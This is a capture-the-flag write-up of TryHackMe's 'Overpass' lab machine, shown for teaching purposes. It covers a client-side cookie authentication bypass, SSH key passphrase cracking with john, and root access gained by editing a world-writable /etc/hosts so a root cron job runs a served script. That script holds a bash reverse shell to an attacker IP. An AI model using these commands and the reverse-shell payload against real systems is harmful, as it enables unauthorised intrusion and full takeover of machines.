# TryHackMe — Overpass

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / Broken Authentication / Cron Job  
**Room:** [tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)  

---

## Summary

Overpass is a Linux machine running a password manager website. The admin panel uses broken JavaScript-based authentication (setting a cookie client-side), granting access to an SSH private key. Privilege escalation exploits a cron job fetching and executing a script from a domain the attacker can hijack via `/etc/hosts`.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV TARGET_IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Golang net/http
```

---

## Web Enumeration

### Gobuster

```bash
gobuster dir -u http://TARGET_IP/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/admin/
/downloads/
/aboutus/
/css/
/img/
```

### Admin Panel Analysis

Visiting `/admin/` shows a login form. Viewing the JavaScript source (`/login.js`):

```javascript
async function login() {
    const usernameBox = document.querySelector("#username")
    const passwordBox = document.querySelector("#password")
    const loginStatus = document.querySelector("#loginStatus")
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        window.location = "/admin"
    }
}
```

The authentication is entirely client-side — if you just set the `SessionToken` cookie to anything, it redirects to admin!

---

## Exploitation

### Bypass Authentication

In browser console:

```javascript
Cookies.set("SessionToken", "anything")
```

Refresh `/admin` — access granted!

The page displays an **RSA private key** for user `james`, along with a note saying the passphrase is weak.

---

## SSH Access

Save the key and crack the passphrase:

```bash
chmod 600 james_rsa
ssh2john james_rsa > james_rsa.hash
john james_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
# james13
```

```bash
ssh -i james_rsa james@TARGET_IP
# Passphrase: james13
```

---

## User Flag

```bash
cat /home/james/user.txt
```

---

## Privilege Escalation

### Cron Job Analysis

```bash
cat /etc/crontab
```

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Root is fetching a script from `overpass.thm` every minute and running it with bash!

### Check /etc/hosts

```bash
cat /etc/hosts
```

```
127.0.0.1 localhost
127.0.1.1 overpass-prod
[... standard entries ...]
```

`overpass.thm` is **not** in `/etc/hosts` — and `/etc/hosts` is **world-writable**!

```bash
ls -la /etc/hosts
# -rw-rw-rw- 1 root root ... /etc/hosts
```

### Hijack the Domain

Add our IP as `overpass.thm`:

```bash
echo "10.10.14.X overpass.thm" >> /etc/hosts
```

Create the expected path on our machine:

```bash
mkdir -p downloads/src/
cat > downloads/src/buildscript.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
EOF
```

Serve it:

```bash
sudo python3 -m http.server 80
```

Start a listener:

```bash
nc -lvnp 4444
```

Wait up to 60 seconds — **root shell obtained**.

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **Never implement auth in client-side JavaScript** — cookies can be set manually by anyone
- Always read JavaScript source files when analyzing login forms
- World-writable `/etc/hosts` combined with a cron job fetching external scripts = instant root
- When a cron fetches from a hostname, check if that hostname is in `/etc/hosts` and if `/etc/hosts` is writable
- `ssh2john` + `john` can crack weak SSH key passphrases quickly

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Web enumeration |
| Browser DevTools | Cookie manipulation |
| ssh2john + john | SSH key passphrase cracking |
| Python HTTP server | Serving malicious script |
| netcat | Reverse shell listener |
